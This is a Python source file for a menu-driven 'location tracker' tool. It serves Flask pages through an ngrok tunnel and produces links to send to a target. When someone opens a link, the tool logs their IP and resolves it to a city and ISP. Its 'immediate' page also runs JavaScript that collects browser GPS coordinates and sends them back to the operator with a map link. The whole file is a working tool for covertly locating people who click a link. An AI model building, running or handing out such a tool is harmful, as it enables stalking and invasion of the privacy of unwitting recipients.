import requests
import datetime
import os
import time
import subprocess
import socket
from flask import Flask, request, render_template_string
from threading import Thread

app = Flask(__name__)

HTML_BASIC = """
<!doctype html>
<html><head><title>Welcome</title></head>
<body><h2>Thanks for visiting</h2><p>Your IP has been logged.</p></body>
</html>
"""

HTML_IMMEDIATE = """
<!DOCTYPE html>
<html>
<head><title>Accurate Location Tracker</title></head>
<body>
  <h2>Thanks for visiting!</h2>
  <p>Your IP has been logged.</p>
  <script>
    fetch("/log_ip", {method: "POST"}).catch(() => {});
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(function(position) {
        fetch("/submit_location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          })
        }).catch(() => {});
      });
    }
  </script>
</body>
</html>
"""

def banner():
    print("\033[92m" + """
╔════════════════════════════════════════════════╗
║              Made by Mohimanul-TVM             ║
╚════════════════════════════════════════════════╝
""" + "\033[0m")

def get_location(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = res.json()
        if data["status"] == "success":
            return {
                "IP": ip,
                "City": data.get("city"),
                "Region": data.get("regionName"),
                "Country": data.get("country"),
                "Latitude": data.get("lat"),
                "Longitude": data.get("lon"),
                "ISP": data.get("isp"),
                "Map": f"https://www.google.com/maps?q={data.get('lat')},{data.get('lon')}",
                "Time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
    except Exception as e:
        return {"IP": ip, "Error": str(e)}
    return {"IP": ip, "Error": "Unknown error"}

@app.route('/')
def index():
    return render_template_string(HTML_BASIC)

@app.route('/log_ip', methods=["POST"])
def log_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    data = get_location(ip)
    print("\n--- Immediate IP Captured ---")
    for k, v in data.items():
        print(f"{k}: {v}")
    print("----------------------------\n")
    return "IP logged"

@app.route('/submit_location', methods=["POST"])
def submit_location():
    data = request.get_json()
    lat = data.get("latitude")
    lon = data.get("longitude")
    accuracy = data.get("accuracy")
    print("\n--- Accurate Location Captured (GPS) ---")
    print(f"Latitude: {lat}")
    print(f"Longitude: {lon}")
    print(f"Accuracy: {accuracy} meters")
    print(f"Map: https://www.google.com/maps?q={lat},{lon}")
    print(f"Time: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("----------------------------------------\n")
    return "Location received!"

@app.route('/immediate')
def immediate():
    return render_template_string(HTML_IMMEDIATE)

def is_port_in_use(port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(("localhost", port)) == 0

def run_flask():
    if is_port_in_use(5000):
        print("[!] Port 5000 is already in use. Trying to continue...")
    app.run(host="0.0.0.0", port=5000)

def download_ngrok():
    if not os.path.isfile("ngrok"):
        print("[•] Downloading ngrok...")
        os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip")
        os.system("unzip ngrok.zip && rm ngrok.zip")
        os.system("chmod +x ngrok")

def start_ngrok():
    os.system("pkill -f ngrok > /dev/null 2>&1")
    token = input("Enter your Ngrok Authtoken: ").strip()
    download_ngrok()
    os.system(f"./ngrok authtoken {token}")
    ngrok_process = subprocess.Popen(["./ngrok", "http", "5000"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    time.sleep(5)
    try:
        tunnels = requests.get("http://localhost:4040/api/tunnels").json()
        for tunnel in tunnels['tunnels']:
            if tunnel['proto'] == 'https':
                public_url = tunnel['public_url']
                return public_url, ngrok_process
    except Exception as e:
        print(f"[✗] Failed to get Ngrok URL: {e}")
        ngrok_process.terminate()
    return None, None

def ip_lookup():
    ip = input("Enter target IP address: ").strip()
    data = get_location(ip)
    print("\n\033[96m--- IP Info ---\033[0m")
    for k, v in data.items():
        print(f"{k}: {v}")
    print("\033[96m----------------\033[0m")

def generate_link():
    url, ngrok_process = start_ngrok()
    if not url:
        return
    flask_thread = Thread(target=run_flask)
    flask_thread.start()
    print(f"\n[✓] Send this link: {url}")
    print("[✓] It shows a basic page and logs visitor IP.")
    try:
        while flask_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        ngrok_process.terminate()
        flask_thread.join()

def immediate_ip_gps_option():
    url, ngrok_process = start_ngrok()
    if not url:
        return
    full_url = url + "/immediate"
    flask_thread = Thread(target=run_flask)
    flask_thread.start()
    print(f"\n[✓] Share this link to capture IP immediately + GPS: {full_url}")
    try:
        while flask_thread.is_alive():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        ngrok_process.terminate()
        flask_thread.join()

def menu():
    banner()
    while True:
        print("\n\033[93m[1]\033[0m Track location using IP")
        print("\033[93m[2]\033[0m Generate link & capture visitor IP (basic page)")
        print("\033[93m[3]\033[0m Generate link & capture visitor IP immediately + GPS (advanced)")
        print("\033[93m[0]\033[0m Exit")
        choice = input("Select an option: ").strip()
        if choice == '1':
            ip_lookup()
        elif choice == '2':
            generate_link()
        elif choice == '3':
            immediate_ip_gps_option()
        elif choice == '0':
            print("Exiting...")
            break
        else:
            print("Invalid option.")

if __name__ == "__main__":
    menu()
